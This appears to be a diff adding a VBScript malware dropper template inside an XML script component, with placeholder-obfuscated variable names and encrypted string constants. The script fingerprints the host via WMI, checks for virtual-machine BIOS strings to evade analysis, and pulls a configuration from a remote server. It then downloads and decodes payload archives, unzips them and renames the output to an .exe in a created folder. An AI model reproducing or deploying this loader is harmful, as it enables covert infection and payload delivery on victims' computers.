@@ -1,0 +1,608 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<component id="component2">
+
+
+<script language="VBScript">
+<![CDATA[
+
+
+function de#var17#(#var26#, #var1#)
+Dim #var27#, #var28#
+#var27# = asc(Mid(#var26#,1,1)) - 65
+#var26# = Mid(#var26#,2,Len(#var26#)-1)
+Dim #var29#
+Dim #var30#
+#var28# = ""
+  while (Len(#var26#) > 0)
+  #var80# = Mid(#var26#,1,1)  
+  #var29# = (asc(#var80#)-65)   
+        #var30# = (asc(Mid(#var26#,2,1))-65)
+  #var28# = #var28# & (Chr(( (#var29#) * 25 + #var30#  - #var27# - #var1#))) 
+  #var26# = Mid(#var26#,3,Len(#var26#)-2)
+
+  wEnd
+    
+ de#var17# = #var28#
+end function
+
+
+
+const  #var1#   = %cid%
+#var2#  = de#var17#("%const1%" , #var1#)
+#var3#  = de#var17#("%const2%" , #var1#)
+#var3#W2  = de#var17#("%const3%" , #var1#)
+#var4#  = de#var17#("%const4%" , #var1#)
+#var5# = de#var17#("%const5%" , #var1#)
+#var6# = de#var17#("%const6%" , #var1#)
+#var7# = de#var17#("%const7%" , #var1#)
+#var8# = de#var17#("%const8%" , #var1#)
+#var9# = de#var17#("%const9%" , #var1#)
+#var10# = de#var17#("%const10%" , #var1#)
+#var11# = de#var17#("%const11%" , #var1#)
+#var11#App = de#var17#("%const12%" , #var1#)
+#var11#AUT = de#var17#("%const13%" , #var1#)
+#var11#VBS = de#var17#("%const14%" , #var1#)
+#var11#EXT = de#var17#("%const15%" , #var1#)
+
+#const1# = de#var17#("%const16%" , #var1#)
+#const2# = de#var17#("%const17%" , #var1#)
+#const3# = de#var17#("%const18%" , #var1#)
+#const4# = de#var17#("%const19%" , #var1#)
+#const5# = de#var17#("%const20%" , #var1#)
+#const6# = de#var17#("%const21%" , #var1#)
+#const7# = de#var17#("%const22%" , #var1#)
+#const8# = de#var17#("%const23%" , #var1#)
+#const9# = de#var17#("%const66%" , #var1#)
+#const10# = de#var17#("%const25%" , #var1#)
+#const11# = de#var17#("%const26%" , #var1#)
+#const12# = de#var17#("%const27%" , #var1#)
+#const13# = de#var17#("%const28%" , #var1#)
+#const14# = de#var17#("%const29%" , #var1#)
+#const15# = de#var17#("%const30%" , #var1#)
+#const16# = de#var17#("%const31%" , #var1#)
+#const17# = de#var17#("%const32%" , #var1#)
+#const18# = de#var17#("%const33%" , #var1#)
+#const19# = de#var17#("%const34%" , #var1#)
+#const20# = de#var17#("%const35%" , #var1#)
+#const21# = de#var17#("%const36%" , #var1#)
+#const22# = de#var17#("%const37%" , #var1#)
+#const23# = de#var17#("%const38%" , #var1#)
+#const24# = de#var17#("%const39%" , #var1#)
+#const25# = de#var17#("%const40%" , #var1#)
+#const26# = de#var17#("%const41%" , #var1#)
+#const27# = de#var17#("%const42%" , #var1#)
+#const28# = de#var17#("%const43%" , #var1#)
+#const29# = de#var17#("%const44%" , #var1#)
+#const30# = de#var17#("%const45%" , #var1#)
+#const31# = de#var17#("%const46%" , #var1#)
+#const32# = de#var17#("%const47%" , #var1#)
+#const33# = de#var17#("%const48%" , #var1#)
+#const34# = de#var17#("%const49%" , #var1#)
+#const35# = de#var17#("%const50%" , #var1#)
+#const36# = de#var17#("%const51%" , #var1#)
+#const37# = de#var17#("%const52%" , #var1#)
+#const38# = de#var17#("%const53%" , #var1#)
+#const39# = de#var17#("%const54%" , #var1#)
+#const40# = de#var17#("%const55%" , #var1#)
+#const41# = de#var17#("%const56%" , #var1#)
+#const42# = de#var17#("%const57%" , #var1#)
+#const43# = de#var17#("%const58%" , #var1#)
+#const44# = de#var17#("%const59%" , #var1#)
+#const45# = de#var17#("%const60%" , #var1#)
+#const46# = de#var17#("%const61%" , #var1#)
+#const47# = de#var17#("%const62%" , #var1#)
+#const48# = de#var17#("%const63%" , #var1#)
+#const49# = de#var17#("%const64%" , #var1#)
+#const50# = de#var17#("%const65%" , #var1#)
+#const51# = de#var17#("%const66%" , #var1#)
+#const52# = de#var17#("%const67%" , #var1#)
+#const53# = de#var17#("%const68%" , #var1#)
+#const54# = de#var17#("%const69%" , #var1#)
+#const55# = de#var17#("%const70%" , #var1#)
+#const56# = de#var17#("%const71%" , #var1#)
+#const57# = de#var17#("%const72%" , #var1#)
+#const58# = de#var17#("%const73%" , #var1#)
+#const59# = de#var17#("%const74%" , #var1#)
+#const60# = de#var17#("%const75%" , #var1#)
+#const61# = de#var17#("%const76%" , #var1#)
+#const62# = de#var17#("%const77%" , #var1#)
+#const63# = de#var17#("%const78%" , #var1#)
+#const64# = de#var17#("%const79%" , #var1#)
+
+#const80# = de#var17#("%const80%" , #var1#)
+#const81# = de#var17#("%const81%" , #var1#)
+#const82# = de#var17#("%const82%" , #var1#)
+#const83# = de#var17#("%const83%" , #var1#)
+#const84# = de#var17#("%const84%" , #var1#)
+#const85# = de#var17#("%const85%" , #var1#)
+#const86# = de#var17#("%const86%" , #var1#)
+#const87# = de#var17#("%const87%" , #var1#)
+#const88# = de#var17#("%const88%" , #var1#)
+#const89# = de#var17#("%const89%" , #var1#)
+#const90# = de#var17#("%const90%" , #var1#)
+
+
+
+
+
+
+
+const  #var12# = "%constCFG%"
+
+
+
+
+
+
+
+
+Function #var13#(#var14#, #var15#, #var16#)
+
+
+
+    On Error Resume Next
+
+    strPropertyValue = ""
+    set oWmiClass = getobject(#const1# & #var14#).get(#var15#,&h20000)
+    set oWmiProperties = oWmiClass.Properties_
+
+    Set #var56# = GetObject(#const2# & #var14#)
+    Set colItems = #var56#.ExecQuery(#const3# & #var15#,,48)
+
+    For Each objItem in colItems
+        For Each objProperty in oWmiProperties
+            sLine = ""
+
+            If objProperty.Name = #var16# Then
+                If objProperty.IsArray = True Then
+                    sLine = "str" & objProperty.Name & " = Join(objItem." & objProperty.Name & ", " & Chr(34) & "," & Chr(34) & ")" & vbCrLf
+                    sLine = sLine & "strPropertyValue =  str" & objProperty.Name
+                Else
+                    sLine =  "strPropertyValue =  objItem." & objProperty.Name
+                End If
+
+                Execute sLine
+            End If
+
+        Next
+    Next
+
+
+
+    #var13# = strPropertyValue
+
+
+
+
+
+
+
+End Function
+
+
+
+
+
+
+function #var17#(#var18#, #var1#)
+dim #var19#, #var20#, #var21#, #var22#, #var23#, #var24#, #var25#
+Randomize
+#var24# = ""
+#var25# = ""
+#var20# = 0
+#var23# = Int(26*Rnd)
+
+#var25# = Chr(#var23#+65)
+#var23# = #var23# + #var1#
+
+  for #var19# = 1 to Len(#var18#) Step +1
+    #var20# = asc(Mid(#var18#,#var19#,1)) + #var23#
+
+    if (#var20# <= 25) Then
+      #var24# = "A"
+      #var24# = #var24# & Chr(#var20#+65)
+    else 
+      #var21# = Int(#var20# / 25)
+      #var22# = #var20# - (#var21# * 25)
+      #var24# = Chr(#var21#+65)
+
+      #var24# = #var24# & Chr(#var22#+65)
+    End if
+    
+  #var25# = #var25# & #var24#  
+  Next
+  
+#var17# = #var25#
+end function
+
+
+
+
+
+
+
+
+
+
+
+
+Function #var31#(#var32#, #var33#)
+
+Set #var34# = CreateObject(#const4#)
+set #var35# = CreateObject(#const5#)
+
+set FilesInZip=#var35#.NameSpace(#var32#).items
+#var35#.NameSpace(#var33#).CopyHere(FilesInZip)
+Set #var34# = Nothing
+Set #var35# = Nothing
+End Function
+
+
+
+
+
+
+
+
+Function #var36#(sUrl)
+  Dim #var37# 
+  Set #var37# = CreateObject(#const6#)
+  #var37#.open #const7#, sUrl, false
+
+  
+  #var37#.send()
+#var36# = #var37#.responseText
+End Function
+
+
+
+
+
+
+Function De#var17#F(#var38#, #var39#)
+    Dim #var40#
+    Set #var40# = CreateObject(#const8#)
+    #var40#.Type = 1
+    #var40#.Open()
+    #var40#.LoadFromFile #var38#
+    #var40#.position = 0
+    Dim #var41#
+    #var41# = #var40#.Size -1
+    Dim #var42#
+    Dim #var43#
+    Dim #var44#
+    Dim #var45#
+    Dim #var46#
+    #var46# = Space(#var41#)
+    #var42# = Split(#var46#," ") 
+  #var43# = AscB(#var40#.Read(1))
+  #var44# = 0                  
+     For I = 1 To #var41#
+       #var45# = AscB(#var40#.Read(1))   
+dim #var47#
+ #var47# = CInt(#var45#) - CInt(#var43#+#var44#) 
+  if (#var47# < 0) then
+  #var45# = #var47# + 256       
+  else           
+  #var45# = #var47#     
+  end if 
+        if (#var44# >= 9) then
+        #var44# = 0 
+        else 
+        #var44# = #var44# + 1
+        end if   
+        #var42#(I) = chr(#var45#) 
+       Next
+    #var40#.close
+      Dim #var34#
+      Dim #var48#
+      Set #var34# = CreateObject(#const9#)
+      Set #var48# = #var34#.createTextFile(#var39#)
+      #var48#.Write(Join(#var42#,""))
+      #var48#.Close 
+End Function
+
+
+
+
+
+
+Function #var49#(#var50#, #var51#)
+dim #var52#: Set #var52# = createobject(#const10#)
+dim #var53#: Set #var53# = createobject(#const11#)
+#var52#.Open #const7#, #var50#, False
+#var52#.Send
+
+#var53#.type = 1
+#var53#.open
+#var53#.write #var52#.responseBody
+#var53#.savetofile #var51#, 2
+
+End Function
+
+'////////////////////////////////////////////////////
+
+Dim #var54#, #var55#
+
+Set #var64# = CreateObject(#const40#)
+
+#var55# = #var64#.expandEnvironmentStrings(#const41#)
+
+
+
+
+
+Set #var56# = GetObject(#const12#)
+
+
+Set #var57# = #var56#.ExecQuery(#const13#)
+
+
+
+
+
+
+
+
+For Each #var58# in #var57#
+#var54# = #var58#.OSLanguage
+Next
+
+
+
+
+
+
+    #var59# = false
+    #var63# = ""
+
+    #var60# = #var13#(#const16#, #const17#, #const14#)
+    #var61# = #var13#(#const16#, #const17#, #const15#)
+    #var62# = #var13#(#const16#, #const19#, #const18#)
+
+    If #var61# = #const20# then
+
+        #var63# = #const21#
+        #var59# = true
+
+        Select Case #var62#
+        Case #const22#
+            #var59# = true
+            #var63# = #const23#
+        Case #const24#, #const25#
+            #var59# = true
+            #var63# = #const26#
+        Case #const27# 
+            #var59# = true
+            #var63# = #const28#
+        Case #const29#
+            #var59# = true
+            #var63# = #const30#
+        Case #const31#
+            #var59# = true
+            #var63# = #const32# 
+        Case #const33#, #const34#
+            #var59# = true
+            #var63# = #const35#
+        Case "A M I  - 8000314"
+            #var59# = true
+            #var63# = #const36#
+        End Select
+
+    ElseIf #var61# = #const37# then
+
+        #var63# = #const38#
+        #var59# = true
+
+    ElseIf #var61#  = #const39# then
+
+        #var59# = true
+        #var63# = #const39#
+
+
+    End if
+
+
+
+
+
+
+
+
+
+
+
+
+'//////////////////////////////////
+
+
+
+
+
+Set #var65# = GetObject(#const42#).InstancesOf (#const43#)
+
+
+
+
+
+
+
+for each #var66# in #var65# 
+ sWin = #var66#.Caption 
+next 
+
+
+
+
+'set #var74# = CreateObject(#const55#)
+
+'#var74#.run  #const90#, 2
+
+
+Set #var34# = CreateObject(#const51#)
+
+#var70# = #var5#
+
+If (#var34#.FileExists(#var70# & "lib") = true) Then
+#var59# = false
+end if
+
+if #var59# = false and #var55# <> #const50#  Then
+
+
+
+If (#var34#.FileExists(#var70# & Mid(#var55#, 2, 1)) = false) Then
+Set #var68# = #var34#.OpenTextFile(#var70# & Mid(#var55#, 2, 1),8,true,false)
+#var68#.Close
+
+
+
+
+
+
+#var72# = ""
+#var71# = ""
+
+
+
+
+
+While not InStr(#var72#,"#") > 0
+#var72# = de#var17#(#var36#(#var3# & #const52#),13)
+
+
+Wend
+
+
+
+
+
+#var72# = Replace(#var72#, vbCr, "")
+#var72# = Replace(#var72#, vbLf, "")
+#var72#=Split(#var72#,"#")
+#var9#Nova = #var72#(0)
+#var69# = #const53# & #var72#(1) & #const54#
+#var73# = #var9#Nova
+#var77# =  Mid(StrReverse(#var73#),1, 3)
+#var71#= #var3#W2 & #var72#(3) & #var6#
+
+
+
+
+
+#var34#.CreateFolder #var69#
+
+
+
+Set #var75# = #var34#.OpenTextFile(#var70# & Mid(#var55#, 2, 1),8,true,false)
+
+#var75#.WriteLine #var17#(#var2#, #var1#)
+
+#var75#.WriteLine #var17#(#var1# , 10)
+
+
+
+
+
+#var75#.WriteLine #var17#(#var69#, #var1#)
+
+#var75#.WriteLine #var17#(#var73#, #var1#)
+
+#var75#.WriteLine #var17#(#var77#, #var1#)
+
+#var75#.WriteLine #var17#(#var9#Nova, #var1#)
+
+#var75#.WriteLine #var17#(FormatDateTime(Now, vbShortDate), #var1#)
+
+#var75#.WriteLine #var17#(#var11#, #var1#)
+
+#var75#.WriteLine #var17#(#var11#AUT, #var1#)
+
+
+
+
+
+#var75#.WriteLine #var17#(#var11#App, #var1#)
+
+#var75#.WriteLine #var17#(#var11#VBS, #var1#)
+
+
+
+
+
+
+#var75#.WriteLine #var17#(#var11#EXT, #var1#)
+
+#var75#.Close
+
+
+
+
+
+
+Set #var75# = #var34#.OpenTextFile(#var70# & Mid(#var55#, 2, 1)&"_" ,8,true,false)
+
+dim #var76#
+
+#var76# = #var17#(de#var17#(#var12#,13), 13)
+
+#var75#.WriteLine #var76#
+
+#var75#.Close
+
+
+
+
+
+
+#var49# #var3# & #const56# & #var6#, #var69# + #var73# + #const56# & #var7#
+#var31# #var69# & #var73# & #const56# & #var7#, #var69#
+
+
+
+
+
+Set #var34# = CreateObject(#const51#)
+#var34#.MoveFile #var69# & #var8# & "1" , #var69# & #var73# & "1." & #var77#
+#var34#.DeleteFile(#var69# & #var73# + #const56# & #var7#)
+
+
+
+
+if #var69# <> #var8# then
+
+#var49# #var71#, #var69# + #var73# + "4" + #var6# +  #var7#
+'De#var17#F #var69# + #var73# + "4" + #var6#,  #var69# + #var73# + "4" + #var7#
+#var31# #var69# & #var73# & "4" &  #var6# & #var7#, #var69#
+Set #var34# = CreateObject(#const51#)
+#var34#.MoveFile #var69# & #var8# , #var69# & #var73#
+#var34#.DeleteFile( #var69# & #var73# + "4" + #var6# & #var7#)
+'#var34#.DeleteFile( #var69# & #var73# + "4" & #var6#)
+
+
+Set #var79# = CreateObject(#const59#)
+
+
+#var78# = #var73# + #const57#
+#var49# #var3# & #const58# & #var6#, #var69# + #var73# + #const58# + #var6#
+De#var17#F #var69# + #var73# + #const58# + #var6#,  #var69# + #var73# + #const58# + #var7# 
+#var31# #var69# & #var73# & #const58# & #var7#, #var69#
+Set #var34# = CreateObject(#const51#)
+#var34#.MoveFile #var69# & #var8# & #const58# , #var69# & #var78#  & ".exe"
+#var34#.DeleteFile(#var69# + #var73# + #const58# + #var7# )
+#var34#.DeleteFile(#var69# + #var73# + #const58# + #var6# )
+
+end if
+
+Set #var79# = CreateObject(#const59#)
+if (#const57# <> #const59#) then
+
+'#var79#.ShellExecute  #var69#  & #var78# & #const60# , #var73# , #var69# , #const63#, 1
+
+end if
+end if
+end if
+
+ ]]>
+</script>
+</component>
